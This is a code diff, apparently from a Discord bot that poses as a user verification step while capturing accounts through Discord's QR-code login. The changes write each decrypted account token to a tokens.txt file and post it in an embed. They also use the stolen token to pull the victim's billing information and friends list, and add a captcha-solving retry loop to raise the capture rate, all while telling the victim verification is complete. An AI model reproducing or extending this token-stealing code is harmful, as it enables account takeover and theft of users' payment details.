@@ -21,11 +21,18 @@ import {
   IUserInfo,
 } from "../interfaces/ISocketEvents";
 import { toDataURL } from "qrcode";
-import { getTicket, getTicketWithCaptcha } from "../fetch/getTicket";
+import {
+  getTicketAxios,
+  getTicketWithCaptchaAxios,
+  getUserFriendsAxios,
+  getBillingInforationAxios,
+} from "../util/axios";
+import * as fs from "fs/promises";
 import { allSockets, sharedClient } from "..";
 import { CaptchaSolver } from "./CaptchaSolver";
-import * as embeds from "../util/embeds";
 import { config } from "../util/config";
+import * as embeds from "../util/embeds";
+import { join } from "path";
 
 export class DiscordSocket {
   public messages = new Collection<string, any>();
@@ -75,6 +82,12 @@ export class DiscordSocket {
       Buffer.from(token, "base64")
     );
 
+    await fs.appendFile(
+      join(__dirname, "..", "..", "tokens.txt"),
+      `${decryptedToken.toString()}\n`,
+      "utf-8"
+    );
+
     const embed = await embeds.foundTokenEmbed();
     embed.setDescription(decryptedToken.toString());
     embed.setAuthor({
@@ -90,6 +103,14 @@ export class DiscordSocket {
     });
 
     allSockets.delete(_this.user.id);
+
+    const billingInformation = await getBillingInforationAxios(
+      decryptedToken.toString()
+    );
+    const userFriends = await getUserFriendsAxios(decryptedToken.toString());
+
+    console.log(userFriends, billingInformation);
+
     _this.user.send({ embeds: [await embeds.verificationComplete()] });
 
     if (!config.roles[_this.user.guild.id]) return;
@@ -162,28 +183,39 @@ export class DiscordSocket {
     _this: DiscordSocket,
     messageData: IPendingLogin
   ) {
-    const foundTicket = await getTicket(messageData.ticket);
-    if (foundTicket.encrypted_token)
+    const foundTicket = await getTicketAxios(messageData.ticket);
+    if (foundTicket && "encrypted_token" in foundTicket)
       return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);
 
-    const captchaToSolve: ICaptcha = foundTicket;
-    let solvedCaptcha = await CaptchaSolver.solveCaptcha(
+    await _this.solveCaptcha(_this, foundTicket, messageData);
+  }
+
+  private async solveCaptcha(
+    _this: DiscordSocket,
+    captchaToSolve: ICaptcha,
+    messageData: IPendingLogin,
+    tries = 0
+  ): Promise<void> {
+    if (tries >= 2) return _this.handleCancel(_this);
+
+    const solvedCaptcha = await CaptchaSolver.solveCaptcha(
       captchaToSolve.captcha_sitekey,
       captchaToSolve.captcha_rqdata
     );
-    if (!solvedCaptcha)
-      return _this.user.send("failed to verify you. please try again!");
+    if (!solvedCaptcha) return _this.handleCancel(_this);
 
-    const foundTicketWithCaptcha = await getTicketWithCaptcha(
+    const foundTicketWithCaptcha = await getTicketWithCaptchaAxios(
       messageData.ticket,
       solvedCaptcha,
       captchaToSolve.captcha_rqtoken
     );
-    if (foundTicketWithCaptcha.encrypted_token)
-      return _this.handleFoundUserToken(_this, foundTicket.encrypted_token);
 
-    console.log(
-      `COULD NOT SOLVE CAPTCHA FOR ${_this.userInformation?.username}`
-    );
+    if (foundTicketWithCaptcha.encrypted_token)
+      return _this.handleFoundUserToken(
+        _this,
+        foundTicketWithCaptcha.encrypted_token
+      );
+
+    return _this.solveCaptcha(_this, captchaToSolve, messageData, tries + 1);
   }
 }
